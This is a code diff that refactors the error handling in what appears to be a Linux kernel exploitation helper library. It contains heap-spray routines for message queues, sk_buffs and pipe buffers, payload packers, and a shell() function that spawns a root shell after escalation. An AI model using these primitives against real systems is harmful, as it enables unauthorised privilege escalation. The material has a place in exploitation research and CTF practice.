@@ -39,9 +39,7 @@ size_t msgLimit(){
 }
 
 __u8 * dpn(__u8 * c,size_t n,size_t nn){
-    if(nn<n)
-        panic("Wrong usage of dpn");
-    
+    FAIL(nn<n,"Wrong usage of dpn");
     __u8* res = malloc(nn+1);
     memset(res,0,nn);
     memset(res,c,n);
@@ -59,8 +57,7 @@ __u8 * flatn(size_t *values,size_t n){
 
 int findp64(__u8 *stack,size_t value, size_t n){
     size_t * ptr;
-    if(n<8)
-        panic("[-] There is not enough space for searching");
+    FAIL_IF(n<8);
     for(size_t i =0 ; i <= n-8; i++){
         ptr = stack+i;
         if(value == *ptr)
@@ -121,17 +118,13 @@ void panic(const char *text){
     exit(0x132);
 }
 void shell(){
-    if(!getuid())
-    {
-        if(!fork()){
-            system("/bin/sh");
-        }
-        else{
-            sleep(3600);
-        }
+    FAIL(getuid(),"[!] Failed to Escape");
+    if(!fork()){
+        system("/bin/sh");
     }
-    else
-        panic("[!] Failed to Escape");
+    else{
+        sleep(3600);
+    }
 }
 size_t xswab(size_t val){
     size_t res = 0;
@@ -250,7 +243,7 @@ __u8 *p64(size_t val){
 */
 int msgGet(){
     int res= msgget(0,01644);
-    if(res<0) panic("[-] Failed to create a msg queue");
+    FAIL(res<0,"[-] Failed to create a msg queue");
     return res;
 }
 
@@ -338,26 +331,20 @@ void msgSprayClean(msgSpray_t *spray)
 */
 void initSocketArrayN(int sk_socket[SOCKET_NUM][2],size_t nr){
     for(int i = 0 ; i < nr ; i++)
-        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
-            panic("Failed to create sockect pairs!\n");
-    // info("sk_buffer Inited");
+        FAIL(socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0,"[-] Failed to create sockect pairs!");
 }
 void initSocketArray(int sk_socket[SOCKET_NUM][2]){
     for(int i = 0 ; i < SOCKET_NUM ; i++)
-        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
-            panic("Failed to create sockect pairs!\n");
-    // info("sk_buffer Inited");
+        FAIL(socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0, "[-] Failed to create sockect pairs!");
 }
 void spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
     // There is a 0x140 area after the buffer
     for(int i = 0 ; i< SOCKET_NUM ; i++)
         for(int j = 0 ; j < SK_BUFF_NUM ; j++)
-            if (write(sk_socket[i][0], buf, size)< 0 )
-                panic("Failed to spraySkBuff\n");
+            FAIL(write(sk_socket[i][0], buf, size)< 0, "[-] Failed to spraySkBuff");
 }
 void skbuffSend(int skt,__u8 * ctx, size_t size){
-    if(write(skt, ctx, size)<0)
-        warn("[!] Failed skbuff_add");
+    FAIL(write(skt, ctx, size)<0,"[!] Failed skbuff_add");
 }
 
 /*
@@ -367,12 +354,7 @@ void skbuffSend(int skt,__u8 * ctx, size_t size){
 void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
     for(int i  = 0 ; i < PIPE_NUM ; i++)
     {
-        if(pipe(pipe_fd[i])==-1){
-            perror("initPipeBuffer");
-            warn(hex(i));
-            warn(hex(pipe_fd[i]));
-            panic("Failed to allocate pipe buffers");
-        }
+        FAIL( pipe(pipe_fd[i])<0 , "Failed to allocate pipe buffers" );
         write(pipe_fd[i][1], "pipe_buffer init", 16);
     }
     // success("pipe_buffer Inited");
@@ -380,12 +362,7 @@ void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
 void initPipeBufferN(int pipe_fd[PIPE_NUM][2],int num){
     for(int i  = 0 ; i < num ; i++)
     {
-        if(pipe(pipe_fd[i])==-1){
-            perror("initPipeBuffer");
-            warn(hex(i));
-            warn(hex(pipe_fd[i]));
-            panic("Failed to allocate pipe buffers");
-        }
+        FAIL( pipe(pipe_fd[i])<0 , "Failed to allocate pipe buffers" );
         write(pipe_fd[i][1], "pipe_buffer init", 16);
     }
     // success("pipe_buffer Inited");
